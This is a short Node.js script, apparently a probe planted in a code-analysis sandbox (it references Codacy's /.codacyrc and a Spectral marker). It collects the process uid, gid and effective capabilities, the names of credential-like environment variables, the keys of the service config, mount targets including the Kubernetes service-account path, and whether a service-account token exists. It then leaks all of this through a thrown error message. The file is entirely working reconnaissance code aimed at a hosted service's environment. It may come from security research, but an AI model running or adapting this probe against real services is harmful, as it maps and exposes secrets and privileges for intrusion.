const fs = require('fs')
const status = fs.readFileSync('/proc/self/status', 'utf8')
const capEff = (status.match(/^CapEff:\s*(\S+)/m) || [,'unknown'])[1]
const uid = typeof process.getuid === 'function' ? process.getuid() : 'na'
const gid = typeof process.getgid === 'function' ? process.getgid() : 'na'
const credKeys = Object.keys(process.env).filter(k => /TOKEN|KEY|SECRET|PASS|CRED/i.test(k)).sort()
const cfg = fs.readFileSync('/.codacyrc', 'utf8')
let cfgKeys = []
try { cfgKeys = Object.keys(JSON.parse(cfg)).sort() } catch (_) {}
const mounts = fs.readFileSync('/proc/self/mountinfo', 'utf8').split('\n').map(x => x.split(' - ')[0].split(' ').pop()).filter(x => ['/src','/.codacyrc','/var/run/secrets/kubernetes.io/serviceaccount'].includes(x)).sort()
const saToken = fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token')
throw new Error('SPECTRAL_MOUNT_BOUNDARY_20260714 uid=' + uid + ' gid=' + gid + ' envCredNames=' + credKeys.length + ' envCredKeys=' + credKeys.join(',') + ' capEff=' + capEff + ' codacyrcBytes=' + cfg.length + ' codacyrcKeys=' + cfgKeys.join(',') + ' mountTargets=' + mounts.join(',') + ' saTokenPresent=' + saToken)